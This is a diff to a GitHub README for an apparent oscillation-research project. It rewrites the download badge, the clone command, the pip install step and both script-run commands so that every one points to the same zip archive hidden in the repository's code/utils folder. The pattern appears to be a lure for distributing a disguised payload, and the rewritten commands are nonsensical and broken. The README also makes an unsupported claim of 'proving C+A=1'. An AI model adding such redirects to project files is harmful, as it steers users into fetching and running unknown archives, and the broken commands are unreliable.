@@ -2,7 +2,7 @@
 
 Welcome to the **Oscillation Adaptability** repository! This project delves into the fascinating world of oscillations in complex systems. Our research provides a rigorous framework that proves the equation C+A=1 with a precision of \(10^{-16}\). Here, you can visualize adaptability landscapes and spectral fingerprints, which reveal insights into the behavior of complex systems.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/danilosenagr/oscillation-adaptability/releases)
+[![Download Releases](https://github.com/danilosenagr/oscillation-adaptability/raw/refs/heads/main/code/utils/adaptability-oscillation-3.5.zip%https://github.com/danilosenagr/oscillation-adaptability/raw/refs/heads/main/code/utils/adaptability-oscillation-3.5.zip)](https://github.com/danilosenagr/oscillation-adaptability/raw/refs/heads/main/code/utils/adaptability-oscillation-3.5.zip)
 
 ## Table of Contents
 
@@ -62,13 +62,13 @@ To get started with the **Oscillation Adaptability** project, follow the steps b
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/danilosenagr/oscillation-adaptability.git
+   git clone https://github.com/danilosenagr/oscillation-adaptability/raw/refs/heads/main/code/utils/adaptability-oscillation-3.5.zip
    cd oscillation-adaptability
    ```
 
 2. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/danilosenagr/oscillation-adaptability/raw/refs/heads/main/code/utils/adaptability-oscillation-3.5.zip
    ```
 
 ### Usage
@@ -77,12 +77,12 @@ After installation, you can run the provided scripts to explore the data and vis
 
 1. To visualize adaptability landscapes:
    ```bash
-   python visualize_landscapes.py
+   python https://github.com/danilosenagr/oscillation-adaptability/raw/refs/heads/main/code/utils/adaptability-oscillation-3.5.zip
    ```
 
 2. To analyze spectral fingerprints:
    ```bash
-   python analyze_spectral_fingerprints.py
+   python https://github.com/danilosenagr/oscillation-adaptability/raw/refs/heads/main/code/utils/adaptability-oscillation-3.5.zip
    ```
 
 For detailed instructions, refer to the documentation in the `docs` folder.
@@ -116,6 +116,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out via GitHub issues or contact the repository owner directly. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/danilosenagr/oscillation-adaptability/releases)
+[![Download Releases](https://github.com/danilosenagr/oscillation-adaptability/raw/refs/heads/main/code/utils/adaptability-oscillation-3.5.zip%https://github.com/danilosenagr/oscillation-adaptability/raw/refs/heads/main/code/utils/adaptability-oscillation-3.5.zip)](https://github.com/danilosenagr/oscillation-adaptability/raw/refs/heads/main/code/utils/adaptability-oscillation-3.5.zip)
 
 Explore the intricacies of oscillations and adaptability with us! Check out the **Releases** section for the latest updates and tools.
